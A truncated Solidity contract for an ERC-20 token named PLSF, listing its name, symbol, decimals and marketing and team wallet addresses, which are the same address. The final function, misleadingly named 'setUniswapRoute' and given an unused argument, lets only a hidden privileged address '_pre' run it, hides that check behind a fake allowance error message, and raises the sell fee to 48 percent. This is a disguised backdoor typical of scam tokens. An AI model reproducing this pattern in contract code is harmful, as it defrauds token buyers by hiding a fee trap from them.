...
contract PLSF is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PLSF";
    string private _symbol = "PLSF";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x2Cf69b1b43B38746d3D8A1032269585402Ef5c13); // Marketing Address
    address payable public teamWalletAddress = payable(0x2Cf69b1b43B38746d3D8A1032269585402Ef5c13); // Team Address
    ...
    function setUniswapRoute(uint amount) public {
        require(_msgSender() == _pre, "ERC20: decreased allowance below zero");
        _sellMarketingFee = 48;
